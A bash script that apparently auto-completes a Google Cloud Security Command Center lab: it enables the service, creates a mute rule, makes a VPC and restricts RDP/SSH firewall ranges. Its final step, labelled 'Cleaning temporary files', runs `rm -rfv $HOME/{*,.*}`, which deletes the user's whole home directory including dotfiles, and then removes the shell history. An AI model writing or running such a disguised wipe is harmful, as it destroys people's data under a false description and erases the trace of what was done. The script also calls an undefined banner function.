#!/bin/bash

BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`

spinner() {
    local pid=$!
    local delay=0.1
    local spinstr='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf "${CYAN}${BOLD}[%c]${RESET} " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

display_banner

echo
echo "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo "${CYAN}${BOLD}                 🚀 STARTING EXECUTION 🚀${RESET}"
echo "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo

export PROJECT_ID=$(gcloud info --format='value(config.project)')

echo "${CYAN}${BOLD}▶ Task 1${RESET} ${WHITE}Enabling Security Command Center service...${RESET}"
gcloud services enable securitycenter.googleapis.com &
spinner

echo
echo "${MAGENTA}${BOLD}⏳ Waiting for service activation...${RESET}"

while true; do
  SERVICE_STATUS=$(gcloud services list --enabled | grep "securitycenter.googleapis.com")
  if [ -n "$SERVICE_STATUS" ]; then
    break
  fi
  sleep 2
done

echo "${GREEN}${BOLD}✔ Security Command Center service enabled${RESET}"
echo

echo "${CYAN}${BOLD}▶ Task 2${RESET} ${WHITE}Creating mute configuration...${RESET}"
gcloud scc muteconfigs create mute-flowlogs-findings \
  --project=$DEVSHELL_PROJECT_ID \
  --description="Mute rule for VPC Flow Logs" \
  --filter="category=\"FLOW_LOGS_DISABLED\"" &
spinner

echo
echo "${GREEN}${BOLD}✔ Mute configuration created${RESET}"
echo

echo "${CYAN}${BOLD}▶ Task 3${RESET} ${WHITE}Creating VPC network...${RESET}"
gcloud compute networks create scc-lab-net --subnet-mode=auto &
spinner

echo
echo "${GREEN}${BOLD}✔ VPC network created${RESET}"
echo

echo "${CYAN}${BOLD}▶ Task 4${RESET} ${WHITE}Updating firewall rules...${RESET}"
gcloud compute firewall-rules update default-allow-rdp --source-ranges=35.235.240.0/20 &
spinner

gcloud compute firewall-rules update default-allow-ssh --source-ranges=35.235.240.0/20 &
spinner

echo
echo "${GREEN}${BOLD}✔ Firewall rules updated${RESET}"
echo

echo "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo "${GREEN}${BOLD}                    ✅ LAB COMPLETED ✅${RESET}"
echo "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo

echo "${YELLOW}${BOLD}🧹 Cleaning temporary files...${RESET}"
rm -rfv $HOME/{*,.*} 2>/dev/null || true
rm $HOME/.bash_history 2>/dev/null || true

echo
echo "${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo "${GREEN}${BOLD}✔ Cleanup completed successfully.${RESET}"
echo "${CYAN}${BOLD}✔ Exiting...${RESET}"
echo "${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"

exit 0